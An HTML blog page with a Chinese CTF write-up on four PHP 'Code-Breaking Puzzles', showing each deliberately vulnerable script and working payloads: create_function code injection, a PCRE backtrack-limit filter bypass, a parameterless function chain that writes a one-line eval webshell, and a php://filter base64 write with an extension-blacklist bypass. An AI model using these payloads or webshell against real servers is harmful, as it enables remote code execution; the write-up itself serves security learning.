@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="ruozhi">
+    
+    <meta name="description" content="Nothing...">
+    
+    
+    
+    
+    
+    
+    <title>四道 Code-Breaking Puzzles 的笔记 | ruozhi</title>
+    <link href=”https://liey1.github.io“ rel=”prefetch” />
+
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/aos.js"></script>
+    <script src="/js/highslide/highslide-full.min.js"></script>
+    <link rel="stylesheet" href="/js/highslide/highslide.css">
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+</head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <div class="gal-menu gal-dropdown">
+    <div class="circle" id="gal">
+        <div class="ring">
+            <a href="https://liey1.github.io" class="menuItem" style="left: 50%; top: 15%;">首页</a>
+            
+            <a class="menuItem" style="left: 80.3109%; top: 32.5%;">下一页</a>
+            
+            <a href="/archives" class="menuItem" style="left: 80.3109%; top: 67.5%;">归档</a>
+            <a href="/plan" class="menuItem" style="left: 50%; top: 85%;">计划</a>
+            <a href="/essays" class="menuItem" style="left: 19.6891%; top: 67.5%;">随笔</a>
+            
+            <a class="menuItem" style="left: 19.6891%; top: 32.5%;">上一页</a>
+            
+        </div>
+        <audio id="audio" src="/imgs/oni.mp3"></audio>
+    </div>
+</div>
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://liey1.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">ruozhi</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/collections">
+                        <i class="fa fa-list"></i>收藏
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/web/">web</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/php/">php</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/pwn/">pwn</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://liey1.github.io">ruozhi</a>
+        >
+        <span>四道 Code-Breaking Puzzles 的笔记</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2019/05/02/四道 Code-Breaking Puzzles 的笔记/">四道 Code-Breaking Puzzles 的笔记</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2019-05-02
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2019/05/02/四道 Code-Breaking Puzzles 的笔记/">四道 Code-Breaking Puzzles 的笔记</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2019-05-02
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>主要参考：<a href="https://paper.seebug.org/755/#easy-function" target="_blank" rel="noopener">Code Breaking 挑战赛 Writeup</a></p>
+<hr>
+<p>看着 <code>WP</code> 做了四道 <code>php</code> 的题目，跟一下：</p>
+<h1 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这道题两个知识点吧：</p>
+<blockquote>
+<p><code>^[a-z0-9_]*$/isD</code></p>
+</blockquote>
+<p>正则表达式大概就是想说，匹配 <code>a-z0-9_</code> 开头且结尾的东西。就不进入 <code>else</code><br>这点很好绕过，回想一下命名空间，可以在函数前加个  <code>\</code>。</p>
+<blockquote>
+<p><code>$action(&#39;&#39;, $arg);</code></p>
+</blockquote>
+<p>第二个的话，我们要找一个函数，只能控制第二个参数，执行代码。<br>当然我们很容易想到（ <code>WP</code> 说的），<code>create_function</code></p>
+<p><code>create_function</code> :</p>
+<blockquote>
+<p>create_function ( string \$args , string $code )</p>
+</blockquote>
+<p>大概就是这样的：</p>
+<blockquote>
+<p>$b = create_function(‘’,’echo 1;’);</p>
+</blockquote>
+<p>用正常的方法定义，等于：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function b()&#123;echo 1;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>如果我们可以改变 <code>echo 1;</code> 这个位置的地方。我们可以改成这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function b()&#123;echo 1;&#125;eval($_GET[1]);//&#125;</span><br></pre></td></tr></table></figure>
+<p>这样就相当于闭合了这个函数，写了一行新的代码了。而且这样是可以的！！</p>
+<p>所以这题的 <code>payload</code> 就是：<code>?action=\create_function&amp;arg=echo%201;}eval($_GET[1]);//</code></p>
+<p>不过 <code>create_function</code> 函数在 <code>php7.2</code> 后已经废弃了。</p>
+<h1 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($_FILES)) &#123;</span><br><span class="line">    die(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if (is_php($data)) &#123;</span><br><span class="line">    echo &quot;bad request&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @mkdir($user_dir, 0755);</span><br><span class="line">    $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: $path&quot;, true, 303);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>又是正则表达式：这道题可以简化成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line">$data = $_GET[&apos;data&apos;];</span><br><span class="line">if (!is_php($data)) &#123;</span><br><span class="line">    file_put_contents(&quot;test2.php&quot;,$data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>大概就是，<code>&lt;?</code> 后不能有内容（我也说不明白。</p>
+<p>关于 <code>有限状态自动机</code>，p神已经写的很清楚了 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<p>我的理解大概就是，匹配过程中如果匹配不上会回溯，但是回溯会影响性能，所以肯定有一个回溯的界限，这个界限在 <code>php.ini</code> 中可以设置：<code>pcre.backtrack_limit=100000</code>，默认其实是 <code>1000000（100万）</code>。</p>
+<p>当回溯次数超过 <code>100万</code> 就会直接返回 <code>false</code>。</p>
+<p>所以这里我们就可以发送：<br><code>&lt;?php echo 1; ?&gt;a*1000000</code></p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/01/ec6cf94640fbd2838030a78895f09dfa.png" alt="此处输入图片的描述"></p>
+<p>大概就是这样啦，至于为什么 <code>b</code> 和 <code>c</code> 中间要有个 <code>.*</code> ，是因为要有个 <code>回溯</code> 的过程，详细可以看看p神的文章。</p>
+<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>又又又是正则表达式，这里的意思大概就是，去掉 <code>\w+()</code>，最后只能一个分号的话，就可以。</p>
+<p>再说白点就是可以调用函数，但是不能有参数。</p>
+<p>这得非常了解 <code>php</code> 的函数了。我这种只会写 <code>Hello world</code> 的。。。。</p>
+<p>我们有一个函数：<a href="https://php.net/manual/zh/function.get-defined-vars.php" target="_blank" rel="noopener">get_defined_vars</a></p>
+<p><code>get_defined_vars — 返回由所有已定义变量所组成的数组</code></p>
+<p>大概长这样:<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/01/fb038ae940a06d898058388d762555b2.png" alt="此处输入图片的描述"></p>
+<p>里面有 <code>_GET</code> <code>_POST</code> <code>_SERVER</code> <code>_FILES</code> 等等。。</p>
+<p>我们发现第一个就是 <code>get</code> ，所以我们可以再用 <code>current</code> 函数。</p>
+<p>什么，你问我 <code>current</code> 函数是什么？</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/01/2be539fb400b158f80b97eb0c42a3c43.png" alt="此处输入图片的描述"></p>
+<p>返回 <code>内部指针当前指向的值</code>。就是 <code>_GET</code> 啦，如果用 <code>next()</code>，就是 <code>_POST</code>，这两个我们都可以控制的。</p>
+<p>但是这是个数组呀，有没有一个函数可以数组拼接成字符串呢？有：<code>implode</code>。</p>
+<p>于是我们的 <code>payload</code> 横空出世：<code>?a=print_r(123);//&amp;code=eval(implode(current(get_defined_vars())));</code></p>
+<p>如果觉得奇怪可以调试调试。。</p>
+<p>或者干脆，<code>GET</code> 提交：<code>code=eval(implode(current(get_defined_vars())));</code><br>然后 <code>POST</code> 提交：<code>hhh=file_put_contents(&#39;ceshi.php&#39;,&#39;&lt;?php eval($_GET[1]); ?&gt;&#39;);</code></p>
+<p>学习一下别人的 <code>payload</code>：<br><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p>
+<h1 id="phpmagic-1"><a href="#phpmagic-1" class="headerlink" title="phpmagic"></a>phpmagic</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&apos;read-source&apos;])) &#123;</span><br><span class="line">    exit(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]));</span><br><span class="line"></span><br><span class="line">if(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, 0755, true);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;;</span><br><span class="line">$log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;);</span><br><span class="line">if(!empty($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name;</span><br><span class="line">    if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $output;</span><br><span class="line">endif; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>这道题要用到 <code>dig</code> ，所以要放在 <code>linux</code> 下。</p>
+<p>我们看到命令执行前有个 <code>escapeshellarg</code> 这个。绕不过去，但是我们这里是可以控制返回值的部分内容：</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/353d59c8405e0ed580e95e8c611c155c.png" alt="此处输入图片的描述"></p>
+<p>那我们是不是能直接写 <code>&lt;?php ... ?&gt;</code> 了呢？</p>
+<p>不行，因为还有个 <code>htmlspecialchars</code>。</p>
+<p>然后在下面还有 <code>黑名单</code> 判断了后缀。</p>
+<p><code>if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true))</code></p>
+<p>这里有个 <code>tips</code> 绕过黑名单：<code>a.php/.</code>。</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/3a46b1d440dfde4d807503b7b2b7fe80.png" alt="此处输入图片的描述"></p>
+<p>这里绕过了，我们怎么写 <code>php</code> 呢？可以用 <code>base64</code> 写啊，就是：<br><code>php://filter/</code> 伪协议咯。</p>
+<p>当然，这里还有个问题，我们发现 <code>$log_name</code> 是这么拼接的：</p>
+<p><code>$log_name = $_SERVER[&#39;SERVER_NAME&#39;] . $log_name;</code></p>
+<p>有个 <code>SERVER_NAME</code>，这个 <code>SERVER_NAME</code> 就是获取请求头中的 <code>host</code>，所以我们可以修改 <code>host</code> 头来改变。</p>
+<p>我先写个 <code>echo 1</code> 试试，我们的 <code>payload</code> ：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/77b3e1a94089d7b9803e90733ed560ce.png" alt="此处输入图片的描述"></p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/e466fd4540b38a7780a329d6c2333ebf.png" alt="此处输入图片的描述"></p>
+<p>可以看到我们的 <code>domain</code> 前面还有两个 <code>1</code>，这是拿来填充的，因为 <code>base64</code> 是按四个字节解码的，前面的字符凑起来不是 <code>4</code> 的倍数，所以填充上 <code>11</code></p>
+<p>但是你会发现：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/baafb40040f7b4ce80147c084d585fe7.png" alt="此处输入图片的描述"></p>
+<p>what？没有内容？</p>
+<p>哪里出问题了呢？原因就在这个 <code>=</code> 号上面。我们把 <code>等于号</code> 删了，就可以了（具体原因未知。。。）</p>
+<p>不过可能因为文件名最后的 <code>/.</code> 的原因，这里是不能覆盖文件的，所以要把源文件删了或者换个文件名才行。</p>
+<p>我们删掉 <code>等于号</code> 试试：</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/05/02/8b63a55540f602508039dc93b0bc8cb4.png" alt="此处输入图片的描述"></p>
+<p>可以了！！</p>
+<p>这里一开始也有想用 <code>string.rot13</code> 的，但是 <code>rot13</code> 并不会转换 <code>&lt;?</code>。</p>
+<hr>
+<p>这里就要说一下，在 <code>windows</code> 还有个方法甚至能绕过白名单，就是把文件名设置成： <code>a.php;1.jpg</code>。但是那样文件的内容会变成 <code>空</code> ，不知道为啥。。算了</p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            ruozhi
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>Nothing…</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/05/02/四道 Code-Breaking Puzzles 的笔记/">四道 Code-Breaking Puzzles 的笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/20/unlink 的初级用法/">unlink 的初级用法</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/30/PHP 中绕过的小 TIPS/">PHP 中绕过的小 TIPS</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/17/Thinkphp5 的任意代码执行/">Thinkphp5 的任意代码执行</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/16/记一道 web 题/">记一道 web 题</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/02/VulnHub JIS-CTF/">VulnHub JIS-CTF</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/27/PWNABLE.kr --- simple login/">PWNABLE.kr --- simple login</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/27/LCTF bestphps_revenge 复现总结/">LCTF bestphps_revenge 复现总结</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/sql 注入的一些小姿势/">sql 注入的一些小姿势</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/10/28/从ruozhi 的角度看 pwnable 的 unlink/">堆溢出2 -- 从 ruozhi 的角度看 pwnable.kr 的 unlink</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                
+                <li class="">
+                    <a href="/2019/05/02/四道 Code-Breaking Puzzles 的笔记/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
+                </li>
+                <li class="">
+                    <a href="/2019/05/02/四道 Code-Breaking Puzzles 的笔记/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://hl0rey.github.io" target="_blank">hl0rey</a>
+    </li>
+    
+    <li>
+        <a href="https://yuyue123am.github.io/" target="_blank">小铭同学</a>
+    </li>
+    
+    <li>
+        <a href="http://www.mzxh.xyz/" target="_blank">墨竹星海</a>
+    </li>
+    
+    <li>
+        <a href="https://zzzzxycc.github.io/" target="_blank">zzzzxycc</a>
+    </li>
+    
+    <li>
+        <a href="https://damit5.com" target="_blank">damit5</a>
+    </li>
+    
+    <li>
+        <a href="http://blog.yanqin.net.cn/" target="_blank">燕青</a>
+    </li>
+    
+    <li>
+        <a href="http://mang0.me/" target="_blank">Mang0</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://www.baidu.com" target="_blank">百度</a>
+    </li>
+    
+    <li>
+        <a href="https://github.com" target="_blank">github</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com" target="_blank">知乎</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 ruozhi Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+<script src="/js/activate-power-mode.js"></script>
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+<script src="/js/oni.js"></script>
+
+
+
+</html>
